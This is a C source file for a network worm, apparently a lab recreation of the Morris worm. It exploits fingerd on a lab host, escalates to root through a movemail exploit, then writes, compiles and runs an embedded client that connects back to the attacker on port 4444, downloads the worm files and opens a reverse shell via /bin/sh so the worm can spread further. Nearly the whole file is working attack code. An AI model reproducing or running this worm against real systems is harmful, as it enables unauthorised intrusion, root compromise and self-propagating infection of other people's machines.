#include "worm.h"
#include <sys/signalfd.h>
#include <signal.h>

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)
#define MAX(a, b) ((a > b) ? (a) : (b))

#define FINGERD_PORT 79
#define TARGET_PRIME_IP "172.20.0.10"
#define VECTOR_PROGRAM "#include <stdio.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n#include <arpa/inet.h>\n\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\nint send_int(num, fd)\n\tint num;\n\tint fd;\n{\n\tunsigned long conv = htonl((unsigned long)num);\n\tchar *data = (char*)&conv;\n\tint left = sizeof(conv);\n\tint rc;\n\tdo {\n\t\trc = write(fd, data, left);\n\t\tif (rc < 0) {\n\t\t\treturn -1;\n\t\t}\n\t\telse {\n\t\t\tdata += rc;\n\t\t\tleft -= rc;\n\t\t}\n\t}\n\twhile (left > 0);\n\treturn 0;\n}\n\nint receive_int(num, fd)\n\tint *num;\n\tint fd;\n{\n\tunsigned long ret;\n\tchar *data = (char*)&ret;\n\tint left = sizeof(ret);\n\tint rc;\n\tdo {\n\t\trc = read(fd, data, left);\n\t\tif (rc <= 0) { /* instead of ret */\n\t\t\treturn -1;\n\t\t}\n\t\telse {\n\t\t\tdata += rc;\n\t\t\tleft -= rc;\n\t\t}\n\t}\n\twhile (left > 0);\n\t*num = ntohl(ret);\n\treturn 0;\n}\n\nint main(argc, argv)\n\tint argc;\n\tchar *argv[];\n{\n\tint i, j, n, ss, fz, len, fn;\n\tstruct timeval tv;\n\tstruct sockaddr_in saddr;\n\tchar io_buf[IO_BUF_SIZE];\n\tfd_set read_fds;\n\tFILE *outfile;\n\tchar *file_name;\n\tchar *msg = \"Files recieved\\n\";\n\tchar *hello = \"Hello from client!\\n\";\n\n\tif (argc < 2) {\n\t\treturn 1;\n\t}\t\n\n\tss = socket(AF_INET, SOCK_STREAM, 0);\n\tif (ss < 0) {\n\t\treturn 1;\n\t}\n\n\tbzero((char *)&saddr, sizeof(saddr));\n\tsaddr.sin_family = AF_INET;\n\tsaddr.sin_port = htons(SERVER_PORT);\n\tsaddr.sin_addr.s_addr = inet_addr(argv[1]);\n\t\n\twhile (connect(ss, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {\n\t\tsleep(1);\n\t}\t\n\n\twhile (1) {\n\t\twrite(ss, hello, strlen(hello));\n\t\tFD_ZERO(&read_fds);\n\t\tFD_SET(ss, &read_fds);\n\t\ttv.tv_sec = 5;\n\t\ttv.tv_usec = 0;\n\t\tif (select(ss + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n\t\t\tif (receive_int(&fn, ss) < 0) continue;\t\n\t\t\tif (send_int(fn, ss) < 0) continue;\n\t\t\tfor (i = 0; i < fn; i++) {\n\t\t\t\tif (receive_int(&len, ss) < 0) continue;\t\n\t\t\t\tfile_name = (char *)malloc((len + 1) * sizeof(char));\n\t\t\t\tn = read(ss, file_name, len);\n\t\t\t\tfile_name[n] = '\\0';\n\t\t\t\tif (n <= 0) break;\n\t\t\t\toutfile = fopen(file_name, \"w\");\n\t\t\t\tif (outfile == NULL) break;\n\t\t\t\tif (receive_int(&fz, ss) < 0) continue;\t\n\t\t\t\twhile (fz > 0) {\n\t\t\t\t\tn = read(ss, io_buf, IO_BUF_SIZE -1);\n\t\t\t\t\tif (n > 0) {\n\t\t\t\t\t\tio_buf[n] = '\\0';\n\t\t\t\t\t\tfputs(io_buf, outfile);\n\t\t\t\t\t}\n\t\t\t\t\tfz -= n;\n\t\t\t\t}\t\n\t\t\t\tfclose(outfile);\n\t\t\t\tfree(file_name);\n\t\t\t\tsend_int(i, ss);\n\t\t\t}\t\n\t\t\twrite(ss, msg, strlen(msg));\n\t\t\tbreak;\n\t\t}\t\n\t}\n\tdup2(ss,1);\n\tdup2(ss,0);\n\texecl(\"/bin/sh\", \"/tmp/sh\", 0);\n\treturn 0;\n}\n"

#define NUM_FILES 2
#define FILE_BUF_SIZE 256

#define NUM_FILE_CLIENTS 5
#define NUM_LOG_CLIENTS 10
#define FILE_SERVER_PORT 4444
#define LOG_SERVER_PORT 5555

void handle_connection_event(
		char *server_type,
		int fd,
		struct sockaddr *sock_addr, 
		socklen_t *sock_addrlen, 	
		int *client_sock, 
		int num_clients
	) {
	int i;
	int accept_code = accept(fd, sock_addr, sock_addrlen);
	if (accept_code < 0) return;

	for (i = 0; i < num_clients; i++) {
		if (client_sock[i] == -1) { 
			printf("New %s client connection received! FD: %d\n", server_type, accept_code);
			client_sock[i] = accept_code;
			return;
		}	
	}	
	printf("%s client capacity reached!\n", server_type);
}	

int handle_client_read_event(
		char *server_type,
		int sd, 	
		char *io_buf,
		int io_buf_size
	) {
	int n = read(sd, io_buf, io_buf_size - 1);

	if (n == 0) {
		printf("%s client disconnected\n", server_type);
		return -1;
	} else {	
		io_buf[n] = '\0';
		return 1;
	}	
	 
}	

int  phase2_attack(int sd, char *io_buf) {
	char *success = "Files recieved";

	if (strncmp(success, io_buf, strlen(success)) == 0) { 
		printf("Files sent, expecting shell\n");

		write_to_sock(sd, "ls send_file_over_socket_bsd.c\n");
		read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
		write_to_sock(sd, "ls worm_bsd.h\n");
		read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
		write_to_sock(sd, "cc send_file_over_socket_bsd.c -o server; echo DONE\n");
		read_from_sock(sd, io_buf, (size_t)IO_BUF_SIZE);
		write_to_sock(sd, "./server send_file_over_socket_bsd.c worm_bsd.h\n");
		return 1;
	}	

	return 0;
}	

void server() {
	char io_buf[IO_BUF_SIZE];	
	int i;

	static char *file_paths[NUM_FILES] = { "worm_bsd.h", "send_file_over_socket_bsd.c" };
	struct file_object files[NUM_FILES];	
	char file_buf[FILE_BUF_SIZE];

	fd_set read_fd; 	
    int file_server_fd, log_server_fd, max_fd, accept_code, sd;

    struct sockaddr_in file_serv_addr;
    int file_serv_addrlen = sizeof(file_serv_addr);
	int file_client_sock[NUM_FILE_CLIENTS];

	struct sockaddr_in log_serv_addr;
    int log_serv_addrlen = sizeof(log_serv_addr);
	int log_client_sock[NUM_LOG_CLIENTS];

	// load files
	if (load_files(file_paths, NUM_FILES, files) < 0) 
		handle_error("failed to load files\n");

	for (i = 0; i < NUM_FILES; i++) {
		printf("file_name: %s file_size: %d\n", files[i].file_name, files[i].file_size);
	}	

	// start file server
	file_server_fd = socket(AF_INET, SOCK_STREAM, 0);
	file_serv_addr.sin_family = AF_INET;
	file_serv_addr.sin_addr.s_addr = INADDR_ANY; 
	file_serv_addr.sin_port = htons(FILE_SERVER_PORT);       
	bind(file_server_fd, (struct sockaddr *)&file_serv_addr, sizeof(file_serv_addr));
	listen(file_server_fd, NUM_FILE_CLIENTS + 1);

	for (i = 0; i < NUM_FILE_CLIENTS; i++) {
		file_client_sock[i] = -1;
	}

	// start log server
	log_server_fd = socket(AF_INET, SOCK_STREAM, 0);
	log_serv_addr.sin_family = AF_INET;
	log_serv_addr.sin_addr.s_addr = INADDR_ANY; 
	log_serv_addr.sin_port = htons(LOG_SERVER_PORT);       
	bind(log_server_fd, (struct sockaddr *)&log_serv_addr, sizeof(log_serv_addr));
	listen(log_server_fd, NUM_LOG_CLIENTS + 1);

	for (i = 0; i < NUM_LOG_CLIENTS; i++) {
		log_client_sock[i] = -1;
	}

	// main event loop
	while (1) {
		FD_ZERO(&read_fd);
		FD_SET(file_server_fd, &read_fd);
		FD_SET(log_server_fd, &read_fd);
		//FD_SET(sfd, &read_fd);

		max_fd = MAX(file_server_fd, log_server_fd);

		for (i = 0; i < NUM_FILE_CLIENTS; i++) {
			if (file_client_sock[i] > 0) {
				FD_SET(file_client_sock[i], &read_fd);	
				max_fd = MAX(file_client_sock[i], max_fd);
			}	
		}	

		for (i = 0; i < NUM_LOG_CLIENTS; i++) {
			if (log_client_sock[i] > 0) {
				FD_SET(log_client_sock[i], &read_fd);	
				max_fd = MAX(log_client_sock[i], max_fd);
			}	
		}	
		
		if (select(max_fd + 1, &read_fd, NULL, NULL, NULL) < 0) continue;

		// checking for SIGQUIT from parent
//			if (FD_ISSET(sfd, &read_fd)) {
//				s = read(sfd, &fdsi, sizeof(fdsi));
//             	if (s != sizeof(fdsi))
//                	handle_error("read");
//
//				if (fdsi.ssi_signo == SIGQUIT) {
//					printf("Got SIGQUIT\n"); 
//					break;
//				} else {
//					printf("Read unexpected signal\n");
//				}	
//			}	

		// checking for incoming client connections
		if (FD_ISSET(file_server_fd, &read_fd)) {
			handle_connection_event(
				"file", 
				file_server_fd, (struct sockaddr *)&file_serv_addr, (socklen_t *)&file_serv_addrlen,
				file_client_sock, NUM_FILE_CLIENTS
			);
		}	

		if (FD_ISSET(log_server_fd, &read_fd)) {
			handle_connection_event(
				"log", 
				log_server_fd, (struct sockaddr *)&log_serv_addr, (socklen_t *)&log_serv_addrlen,
				log_client_sock, NUM_LOG_CLIENTS
			);
		}	

		// actually handling clients
		for (i = 0; i < NUM_LOG_CLIENTS; i++) {
			sd = log_client_sock[i];
			if (sd > 0 && FD_ISSET(sd, &read_fd)) {
				if (handle_client_read_event("log", sd, io_buf, IO_BUF_SIZE) < 0) {
					close(sd);
					log_client_sock[i] = -1;
				} else
					printf("Recieved from log client %d: %s", sd, io_buf);
			}	
		}	

		for (i = 0; i < NUM_FILE_CLIENTS; i++) {
			sd = file_client_sock[i];
			if (sd > 0 && FD_ISSET(sd, &read_fd)) {
				if (handle_client_read_event("file", sd, io_buf, IO_BUF_SIZE) < 0) {
					close(sd);
					file_client_sock[i] = -1;
				} else {
					printf("Recieved from file client %d: %s", sd, io_buf);

					if (phase2_attack(sd, io_buf)) {
						close(sd);
						file_client_sock[i] = -1;
					}	
					 
					if (file_client_sock[i] != -1) {
						if (send_files(sd, files, NUM_FILES, file_buf, FILE_BUF_SIZE) < 0)
							printf("Failed to send all files\n");
					}	
				}	
			}	
		}	
	} // end of while loop
}	

void phase1_attack(int fd, char *target_ip) {
	char io_buf[IO_BUF_SIZE];
    char buf[BUF_SIZE];

	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);
	write(fd, buf, (size_t)sizeof(buf));
	sleep(1);
		
	// confirm that you get a shell
	write_to_sock(fd, "echo bang\n");
	write_to_sock(fd, "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n");
	write_to_sock(fd, "whoami\n");
	printf("%s: ", target_ip);
	read_from_sock(fd, io_buf, (size_t)IO_BUF_SIZE);

	// get root shell
	get_root_shell_via_movemail_exploit(fd, io_buf, (size_t)IO_BUF_SIZE);

	// check that you have root shell
	write_to_sock(fd, "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n");
	write_to_sock(fd, "whoami\n");
	printf("%s: ", target_ip);
	read_from_sock(fd, io_buf, (size_t)IO_BUF_SIZE);

	// send over vector file
	write_to_sock(fd, "cd /tmp\n");
	write_to_sock(fd, "cat << EOF >> client.c\n");
	write_to_sock(fd, VECTOR_PROGRAM);
	write_to_sock(fd, "EOF\n");
	
	// compile the client and run it
	write_to_sock(fd, "cc client.c -o client; echo COMPILED MALWARE\n");
	printf("%s: ", target_ip);
	read_from_sock(fd, io_buf, (size_t)IO_BUF_SIZE);
	write_to_sock(fd, "./client 172.20.0.1\n");
}	

void client(char *target_ip) {
    int fingerd_client;
    struct sockaddr_in fingerd_serv_addr;

	fingerd_client = socket(AF_INET, SOCK_STREAM, 0);
	create_sockaddr(&fingerd_serv_addr, target_ip, FINGERD_PORT);

	if (connect(fingerd_client, (struct sockaddr *)&fingerd_serv_addr, sizeof(fingerd_serv_addr)) < 0) {
		handle_error("connect");
	}
	phase1_attack(fingerd_client, target_ip);
	close(fingerd_client);
	exit(1);
}	

int main(int argc, char* argv[]) {
	int i, n;
	// for fingerd exploits

    pid_t pid;

    pid = fork();

    if (pid == -1) {
        perror("fork failed");
    } else if (pid == 0) {
		server();
    } else {
        // Code executed by the parent process
        printf("Hello from the Parent Process! My PID is %d, my Child's PID is %d.\n", getpid(), pid);

		// when there are multiple hosts, I can iterate and fork processes for each target ip
		if (fork() == 0) 
			client(TARGET_PRIME_IP);
		  
		int wstatus;
		waitpid(pid, &wstatus, 0);
		if (WIFEXITED(wstatus)) {
			printf("Child terminated\n");
		}	
    }

    return 0;
}
